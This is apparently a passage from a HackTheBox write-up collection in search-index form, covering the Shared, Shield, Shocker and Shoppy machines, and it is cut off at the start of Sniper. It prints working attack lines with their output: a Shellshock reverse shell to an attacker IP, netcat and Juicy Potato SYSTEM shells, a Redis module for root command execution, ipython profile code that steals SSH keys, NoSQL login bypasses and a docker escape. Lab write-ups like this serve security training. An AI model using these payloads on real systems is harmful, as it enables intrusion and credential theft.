--wordlist=/home/kali/Wordlists/rockyou.txt  hash                                      1 \u2a2f\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\nSoleil101        (?)     \n1g 0:00:00:00 DONE (2022-11-03 13:44) 10.00g/s 20908Kp/s 20908Kc/s 20908KC/s Sportster1..SoccerBabe\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Using the user and the password obtained as SSH credentials (<code>james_mason:Soleil101</code>) I got access to the machine!</p>"},{"location":"HackTheBox/Shared/#in-the-machine-as-james_mason","title":"In the machine as <code>james_mason</code>","text":"<p>The first thing I noticed was that both Redis and MySQL were running as local services. This was more or less expected but good to know.</p> <pre><code>james_mason@shared:/var/www/shared.htb/ps$ netstat -lntp\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      -\n</code></pre> <p>Also got the credentials for the database from the Prestashop configuration files. I was able to extract the administrator password and email from it but no luck with the cracking process so moving on for now.</p> <pre><code># /var/www/shared.htb/ps/app/config$ cat parameters.php \n&lt;?php return array (\n  'parameters' =&gt; \n  array (\n    'database_host' =&gt; '127.0.0.1',\n    'database_port' =&gt; '',\n    'database_name' =&gt; 'pshop',\n    'database_user' =&gt; 'pshop',\n    'database_password' =&gt; 'T*k#cbND_C*WrQ9h',\n...\n</code></pre> <pre><code>MariaDB [pshop]&gt; select email,passwd from ps_employee;\n+------------------+--------------------------------------------------------------+\n| email            | passwd                                                       |\n+------------------+--------------------------------------------------------------+\n| admin@shared.htb | $2y$10$weantheqSfuC7PO4L/tlKefZ59DBBXR7cz5jixaYKyvv3PlPw0xgS |\n+------------------+--------------------------------------------------------------+\n</code></pre> <p>At this point I found a weird directory <code>/opt/scripts_review/</code>. The user <code>james_mason</code> is part of the <code>developer</code> group that can modify the contents of this directory. Since there is another user in the machine according to the <code>/etc/passwd</code> file called <code>dan_smith</code>, my first guess was that this user was executing whatever shell script I put there. Obviously, I was wrong and my scripts just got deleted again and again.</p>"},{"location":"HackTheBox/Shared/#getting-user","title":"Getting user","text":"<p>Using Pspy I saw something interesting:</p> <pre><code>2022/11/03 15:56:01 CMD: UID=1001 PID=7490   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/\n2022/11/03 15:56:01 CMD: UID=1001 PID=7491   | /usr/bin/pkill ipython \n2022/11/03 15:56:01 CMD: UID=1001 PID=7493   | /usr/bin/python3 /usr/local/bin/ipython \n</code></pre> <p>As you can see, the user with UID 1001 (<code>dan_smith</code>) is actually doing some stuff in that folder. The thing is that is not really executing anything. I researched a bit about that <code>ipython</code> thing, looks like it is an interactive shell for Python and it is also used as the kernel for Jupyter. Diving into the documentation, I found something worth it:</p> <p></p> <p>Looks like profiles are used by <code>ipython</code> to load different configurations per project. This configuration files are just Python scripts that can run arbitraty code. According to the image above, I can put my own default profile in the working directory and <code>ipython</code> will happily use that instead of the one in the default location. </p> <p>I procceded to take my own default profile and added these lines to the configuration file:</p> <pre><code># profile_default/ipython_config.py\nimport os\n\nhostname = \"10.10.14.29\"\nresponse = os.system(\"ping -c 1 \" + hostname)\n</code></pre> <p>After that, I just copied the directory to <code>/opt/scripts_review/</code> and waited for the pings in my tcpdump output:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Public/linux/tools]\n\u2514\u2500$ sudo tcpdump icmp -i tun0\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n16:54:52.355603 IP shared.htb &gt; 10.10.14.29: ICMP echo request, id 40114, seq 1, length 64\n16:54:52.355629 IP 10.10.14.29 &gt; shared.htb: ICMP echo reply, id 40114, seq 1, length 64\n</code></pre> <p>Cool! We have code execution as <code>dan_smith</code>. I changed the code to be executed to something more interesting:</p> <pre><code>import os\n\nresponse = os.system(\"cp -r ~/.ssh ~/tricked; chmod -R 777 ~/tricked\")\n</code></pre> <p>This code will copy the <code>.ssh</code> directory of the user <code>dan_smith</code> and change its permissions to allow me to read it. After that, I can just take the <code>dan_smith</code> SSH key and connect to the machine as him.</p>"},{"location":"HackTheBox/Shared/#getting-root","title":"Getting root","text":"<p>Again I found something interesting looking for files with the same groups as the user. In this case the group was <code>sysadmin</code> and the file was a binary:</p> <pre><code>dan_smith@shared:~$ /usr/local/bin/redis_connector_dev\n[+] Logging to redis instance using password...\n\nINFO command result:\n# Server\nredis_version:6.0.15\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:4610f4c3acf7fb25\nredis_mode:standalone\nos:Linux 5.10.0-16-amd64 x86_64\narch_bits:64\nmultiplexing_api:epoll\natomicvar_api:atomic-builtin\ngcc_version:10.2.1\nprocess_id:10650\nrun_id:549c5725e037e36a1b621808b04554126747e2b1\ntcp_port:6379\nuptime_in_seconds:36\nuptime_in_days:0\nhz:10\nconfigured_hz:10\nlru_clock:6566958\nexecutable:/usr/bin/redis-server\nconfig_file:/etc/redis/redis.conf\nio_threads_active:0\n &lt;nil&gt;\n</code></pre> <p>Remember the local Redis server? Well this program is connecting to it and pulling some information. Checking the Redis process I can see that it is running as <code>root</code> so I guess we found a possible privilege escalation vector.</p> <pre><code>dan_smith@shared:~$ ps -aux | grep redis\nroot       10802  0.2  0.7  65104 14624 ?        Ssl  17:39   0:00 /usr/bin/redis-server 127.0.0.1:6379\n</code></pre> <p>In order to get the password, there are two options:</p> <ul> <li>Reverse engineer the binary</li> <li>Try to listen for the packages comming from the binary to the Redis service</li> </ul> <p>Let's see both options, the first one is pretty straigh forward. Using IDA64 you can decompile the binary and then search for the string \"Logging\". Why is that? Well the binary output shows:</p> <pre><code>[+] Logging to redis instance using password...\n</code></pre> <p>When starting the connection to Redis, my guess is that the password value should be near that. As you can see that is the case:</p> <p></p> <p>The problem with this method is that, even though the password is there, it has some junk at the end and we would need some try and error in order to get into Redis.</p> <p>Time for the second method! You will say, man how do you pretend to sniff traffic if you are not root in the other machine? Well my friend, good question! I downloaded to my machine the binary and using SSH I forwarded my port 6379 to the victim port 6379. This way I can just listen for packages in my own machine!</p> <pre><code># Start port forwarding\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shared]\n\u2514\u2500$ ssh dan_smith@10.10.11.172 -i id_rsa -NL 6379:127.0.0.1:6379\n\n# Start TCP dump with a config to generate a pcap file\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shared]\n\u2514\u2500$ sudo tcpdump tcp -i lo -s 65535 -w redis.pcap\ntcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 65535 bytes\n14 packets captured\n28 packets received by filter\n0 packets dropped by kernel\n\n# Launch the binary from my machine\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shared]\n\u2514\u2500$ ./redis_connector_dev                                      \n[+] Logging to redis instance using password...\n...\n</code></pre> <p>Checking the <code>pcap</code> file I got the password for the Redis server! <code>F2WHqJUz2WEz=Gqq</code></p> <p></p> <p>Now the only thing left is to load a custom module into Redis to start executing system commands as <code>root</code>. The module I will use is this: n0b0dyCN/RedisModules-ExecuteCommand, just compile it with <code>make</code> in the attacker machine and move it to the victim. Now we can load it from Redis and the magic happens!</p> <pre><code># In the victim machine\ndan_smith@shared:~$ redis-cli -h 10.85.0.52\n127.0.0.1:6379&gt; auth F2WHqJUz2WEz=Gqq\nOK\n127.0.0.1:6379&gt; MODULE LIST\n(empty array)\n127.0.0.1:6379&gt; MODULE LOAD /home/dan_smith/module.so\nOK\n127.0.0.1:6379&gt; system.exec \"id\"\n\"uid=0(root) gid=0(root) groups=0(root)\\n\"\n127.0.0.1:6379&gt; system.rev 10.10.14.29 8080\n\"\"\n\n# In my machine\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shared]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.29] from (UNKNOWN) [10.10.11.172] 49804\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>We are <code>root</code>! Grab the flag and call it a day!</p>"},{"location":"HackTheBox/Shield/","title":"Shield","text":""},{"location":"HackTheBox/Shield/#nmap-scan","title":"nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 12:39 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.11s latency).\nNot shown: 998 filtered ports\nPORT     STATE SERVICE\n80/tcp   open  http\n3306/tcp open  mysql\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p80,3306 -sC -sV \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 12:41 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.33s latency).\n\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n3306/tcp open  mysql   MySQL (unauthorized)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.56 seconds\n</code></pre> <p>The scan shows a MySQL server and a web server (I also run a scan of all the ports but looks like not more ports open). Look's like MySQL server is only accesible from <code>localhost</code> so let's start checking the web server. </p>"},{"location":"HackTheBox/Shield/#port-80","title":"Port 80","text":"<p>The web server shows the default ISS page. <code>gobuster</code> time I guess, since is a Windows box we can use the lowercase wordlist because NTFS is case insensitive:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://&lt;MACHINE_IP&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://&lt;MACHINE_IP&gt;\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2021/09/02 12:51:38 Starting gobuster in directory enumeration mode\n===============================================================\n/wordpress            (Status: 301) [Size: 152] [--&gt; http://&lt;MACHINE_IP&gt;/wordpress/]\n===============================================================\n2021/09/02 12:53:13 Finished\n===============================================================\n</code></pre> <p>Cool, a Wordpress site time for enumeration. Checking the blog page I found that <code>admin</code> is a valid user so we have something for a brute force attack if necessary.</p> <p>Before attempting a brute force attack (<code>xmlrpc</code> is enabled so we can try to do it) i tried some previous challenges passwords and <code>P@s5w0rd!</code> worked!</p> <p>Once in the Wordpress admin panel getting a reverse shell is trivial editing the theme templates. I edited the <code>404.php</code> template of the <code>twentynineteen</code> theme. I added a Windows PHP reverse shell to it and after setting up a listener y executed the shell in <code>/wp-content/themes/twentynineteen/404.php</code>.</p>"},{"location":"HackTheBox/Shield/#in-the-box","title":"In the box","text":"<p>Once in the box the first thing we can grab are the database credentials and get access to it if we wish to. The credentials are found in the Wordpress <code>wp-config.php</code> file:</p> <pre><code>// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'wordpress124');\n\n/** MySQL database username */\ndefine('DB_USER', 'wordpressuser124');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'P_-U9dA6q.B|');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n</code></pre> <p>The thing is that there is something better. Using the <code>systeminfo</code> command we see that the server is using <code>Microsoft Windows Server 2016 Standard</code> which is vulnerable to Rotten Potato. In this case we will use Juicy Potato that is basically an improve Rotten Potato. After uploading the exploit binary we will also need a <code>netcat</code> binary to get a reverse shell with <code>system</code> privileges. Once we have all in the box we can prepare a listener and launch the exploit:</p> <pre><code>PS C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads&gt; .\\jp.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e cmd.exe &lt;MY_IP&gt; 9000\" -t *\nTesting {4991d34b-80a1-4291-83b6-3328366b9097} 1337\n......\n[+] authresult 0\n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM\n\n[+] CreateProcessWithTokenW OK\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Shield/www]\n\u2514\u2500$ nc -lnvp 9000                                             \nlistening on [any] 9000 ...\nconnect to [&lt;MY_IP&gt;] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 50123\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>Boom! The <code>root</code> flag is in  <code>C:\\Users\\Administrator\\Desktop\\root.txt</code></p>"},{"location":"HackTheBox/Shield/#post-exploitation","title":"Post exploitation","text":"<p>Once we are <code>system</code> we can try to get some credentials from the users in the system. Uploading a <code>mimikatz</code> binary we can get <code>sandra:Password1234!</code>credentials using the <code>sekurlsa::logonpasswords</code> functionality.</p>"},{"location":"HackTheBox/Shocker/","title":"Shocker","text":""},{"location":"HackTheBox/Shocker/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.10.56\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 13:14 EST\nNmap scan report for 10.10.10.56\nHost is up (0.064s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\n\nNmap done: 1 IP address (1 host up) scanned in 20.69 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p80,2222 10.10.10.56\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 13:17 EST\nNmap scan report for 10.10.10.56\nHost is up (0.057s latency).\n\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.96 seconds\n</code></pre> <p>Looks like only two ports are open. Since one of them is SSH let's start looking around the website.</p>"},{"location":"HackTheBox/Shocker/#port-80","title":"Port 80","text":"<p>The page only shows a simple index page so we can go for a Gobuster scan. After a while the scan revealed that the <code>cgi-bin</code> directory exists on the server so the next step would be to check for scripts inside this directory.</p> <p>A <code>gobuster</code> scan looking for common extensions of files in this directory revealed that <code>user.sh</code> exists. Maybe the server is vulnerable to Shellshock so let's spin up a listener and execute:</p> <pre><code>curl -H 'User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.20/8000 0&gt;&amp;1' http://10.10.10.56/cgi-bin/user.sh\n</code></pre> <p>And we have prize!:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8000\nlistening on [any] 8000 ...\nconnect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 47224\nbash: no job control in this shell\nshelly@Shocker:/usr/lib/cgi-bin$\n</code></pre> <p>Now we can just stabilize the shell and start to enumerate the host.</p>"},{"location":"HackTheBox/Shocker/#in-the-box-as-shelly","title":"In the box as shelly","text":"<p>The web server is running as the <code>shelly</code> user so we can just grab the user flag under: <code>/home/shelly/user.txt</code>. Now performing some basic enumeration tasks we can see this:</p> <pre><code>shelly@Shocker:/$ sudo -l\nMatching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl\n</code></pre> <p>Since we can execute <code>perl</code> with <code>sudo</code> we should be able to escalate.</p>"},{"location":"HackTheBox/Shocker/#getting-root","title":"Getting root","text":"<p>We can just execute <code>bash</code> from <code>perl</code> to get a <code>root</code> shell:</p> <pre><code>shelly@Shocker:/$ sudo perl -e 'exec \"/bin/bash\";'\nroot@Shocker:/#\n</code></pre> <p>And we can just get the root flag under: <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Shoppy/","title":"Shoppy","text":""},{"location":"HackTheBox/Shoppy/#nmap","title":"Nmap","text":"<p>Like always let's start with Nmap!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB]\n\u2514\u2500$ sudo nmap --min-rate 1000 -p- 10.10.11.180\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-30 13:20 CET\nNmap scan report for 10.10.11.180\nHost is up (0.084s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n9093/tcp open  copycat\n\nNmap done: 1 IP address (1 host up) scanned in 60.54 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB]\n\u2514\u2500$ sudo nmap -sC -sV -p 22,80,9093 10.10.11.180\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-30 13:23 CET\nNmap scan report for 10.10.11.180\nHost is up (0.062s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)\n|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)\n|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)\n80/tcp   open  http     nginx 1.23.1\n|_http-server-header: nginx/1.23.1\n|_http-title: Did not follow redirect to http://shoppy.htb\n9093/tcp open  copycat?\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest, HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Content-Type: text/plain; version=0.0.4; charset=utf-8\n|     Date: Wed, 30 Nov 2022 12:22:26 GMT\n|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.\n|     TYPE go_gc_cycles_automatic_gc_cycles_total counter\n|     go_gc_cycles_automatic_gc_cycles_total 546\n|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.\n|     TYPE go_gc_cycles_forced_gc_cycles_total counter\n|     go_gc_cycles_forced_gc_cycles_total 0\n|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.\n|     TYPE go_gc_cycles_total_gc_cycles_total counter\n|     go_gc_cycles_total_gc_cycles_total 546\n|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n|     TYPE go_gc_duration_seconds summary\n|     go_gc_duration_seconds{quantile=\"0\"} 4.4953e-05\n|     go_gc_duration_seconds{quantile=\"0.25\"} 9.7211e-05\n|_    go_gc\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 102.74 seconds\n</code></pre> <p>I will focus in both the port 80 and that weird thing in port 9093.</p>"},{"location":"HackTheBox/Shoppy/#port-80","title":"Port 80","text":""},{"location":"HackTheBox/Shoppy/#first-exploit","title":"First exploit","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB]\n\u2514\u2500$ gobuster dir -u http://shoppy.htb/ -w ~/Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.3\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://shoppy.htb/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /home/kali/Wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.3\n[+] Timeout:                 10s\n===============================================================\n2022/11/30 13:32:39 Starting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 179] [--&gt; /images/]\n/login                (Status: 200) [Size: 1074]\n/admin                (Status: 302) [Size: 28] [--&gt; /login]\n/assets               (Status: 301) [Size: 179] [--&gt; /assets/]\n/css                  (Status: 301) [Size: 173] [--&gt; /css/]\n/Login                (Status: 200) [Size: 1074]\n/js                   (Status: 301) [Size: 171] [--&gt; /js/]\n/fonts                (Status: 301) [Size: 177] [--&gt; /fonts/]\n/Admin                (Status: 302) [Size: 28] [--&gt; /login]\n/exports              (Status: 301) [Size: 181] [--&gt; /exports/]\n/LogIn                (Status: 200) [Size: 1074]\n===============================================================\n2022/11/30 13:45:08 Finished\n===============================================================\n</code></pre> <p>The login page is weird, injecting a <code>'</code> character the page just hangs. Trying SQL payloads I just got timeouts, maybe we can inject something else? I crafted something like this:</p> <pre><code>Hola' + '123' + 'Hola\n</code></pre> <p>And the page was able to return... The port 9093 looks like a dump of something related to Go so lets try to inject Go code instead of SQL:</p> <pre><code>Hola' || 1==1 || 'Hola\n</code></pre> <p>Using that payload I was able to bypass the login page and get access to the admin dashboard! In there, there is an option to search for users. I tried to, once again, inject the same payload I used before in the login page hoping to get all the users of the database and looks like we are lucky here:</p> <pre><code>[\n    {\n        \"_id\":\"62db0e93d6d6a999a66ee67a\",\n        \"username\":\"admin\",\n        \"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"\n    },\n    {\n        \"_id\":\"62db0e93d6d6a999a66ee67b\",\n        \"username\":\"josh\",\n        \"password\":\"6ebcea65320589ca4f2f1ce039975995\"\n    }\n]\n</code></pre> <p>I was able to crack the password for the <code>josh</code> user using the Rockyou dictionary:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shoppy]\n\u2514\u2500$ john --format=raw-md5 --wordlist=~/Wordlists/rockyou.txt hash                                             \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nremembermethisway (josh)     \n1g 0:00:00:01 DONE (2022-11-30 14:50) 0.6172g/s 8853Kp/s 8853Kc/s 9355KC/s  fuckyooh21..*7\u00a1Vamos!\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>I tried the credentials <code>josh:remembermethisway</code> for SSH but no luck. </p>"},{"location":"HackTheBox/Shoppy/#finally-user","title":"Finally user!","text":"<p>After some hours I was really lost whith this box but I found something using <code>wfuzz</code> instead of <code>gobuster</code> for enumerating virtual hosts:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Shoppy]\n\u2514\u2500$ wfuzz -H \"Host: FUZZ.shoppy.htb\" --hc 404,403,301 -H \"User-Agent: PENTEST\" -c -w /home/kali/Wordlists/SecLists/Discovery/DNS/namelist.txt http://shoppy.htb\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://shoppy.htb/\nTotal requests: 151265\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                             \n=====================================================================\n\n000082865:   200        0 L      141 W      3122 Ch     \"mattermost\"                                        \n</code></pre> <p>For some reason, <code>gobuster</code> was not able to find the Mattermost subdomain... Anyway, I was able to login using the found credentials and got the user and password for the SSH service in one of the chats: <code>jaeger:Sh0ppyBest@pp!</code>. Fun fact, the application is using a Mongo database and that is why the SQL payloads failed. Why I though about Go code instead of trying NoSQL? Well let's say that the port 9093 baited me...</p>"},{"location":"HackTheBox/Shoppy/#privesc-to-deploy","title":"Privesc to <code>deploy</code>","text":"<p>Another thing I found in the Mattermost app was a chat speaking about a password manager. I was able to find it under <code>/home/deploy</code>, looks like the code and a file with credentials are also in there but Im only allowed to read the binary so I downloaded it to my machine.</p> <p>According to <code>sudo -l</code> we can execute this binary as <code>deploy</code>: <pre><code>jaeger@shoppy:/home/deploy$ sudo -l\n[sudo] password for jaeger: \nMatching Defaults entries for jaeger on shoppy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jaeger may run the following commands on shoppy:\n    (deploy) /home/deploy/password-manager\n</code></pre></p> <p>The binary asks for a master password when executed. According to the strings in the binary, it will read the credentials file from <code>/home/deploy</code> after introducing the correct password. The password is probably stored somewhere in the binary so time to reverse it. Using IDA was easy to find the password harcoded in the code, it was <code>Sample</code>.</p> <p></p> <p>Using this information, we can just get the password for the <code>deploy</code> user:</p> <pre><code>jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager\nWelcome to Josh password manager!\nPlease enter your master password: Sample\nAccess granted! Here is creds !\nDeploy Creds :\nusername: deploy\npassword: Deploying@pp!\n</code></pre>"},{"location":"HackTheBox/Shoppy/#pwned","title":"Pwned!","text":"<p>The privilege escalation for <code>root</code> is pretty easy, the user <code>deploy</code> is part of the <code>docker</code> group so we can manage containers. Since the Alpine image is already in the machine the attack vector is straigh forward.</p> <pre><code>deploy@shoppy:~$ id\nuid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)\ndeploy@shoppy:~$ docker images\nREPOSITORY   TAG       IMAGE ID       CREATED        SIZE\nalpine       latest    d7d3d98c851f   4 months ago   5.53MB\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> <p>We only need to create a container that will have all the host filesystem mounted in the <code>/mnt</code> directory and will execute the <code>chroot</code> command to change the container filesystem root to the <code>/mnt</code> directory. Since we are root inside de container, we are now effectively root in the host machine.</p> <pre><code>deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# id\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n</code></pre>"},{"location":"HackTheBox/Sniper/","title":"Sniper","text":""},{"location":"HackTheBox/Sniper/#nmap","title":"Nmap","text":"<p>Let's start with the typical Nmap scan to see what we have.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- 10.10.10.151\n[sudo] password for kali: \nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:36 EDT\nNmap scan report for 10.10.10.151\nHost is up (0.059s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n49667/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 87.49 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p80,135,139,445,49667 10.10.10.151\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:39 EDT\nNmap scan report for 10.10.10.151\nHost is up (0.058s latency).\n\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Sniper Co.\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n49667/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h00m01s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2022-11-01T21:40:18\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 95.99 seconds\n</code></pre> <p>After a quick test, null sessions are not allowed in the SMTP service so I will start wit the webserver for now.</p>"},{"location":"HackTheBox/Sniper/#port-80","title":"Port 80","text":"<p>The first thing I tried was to check the different directories of the site:</p> 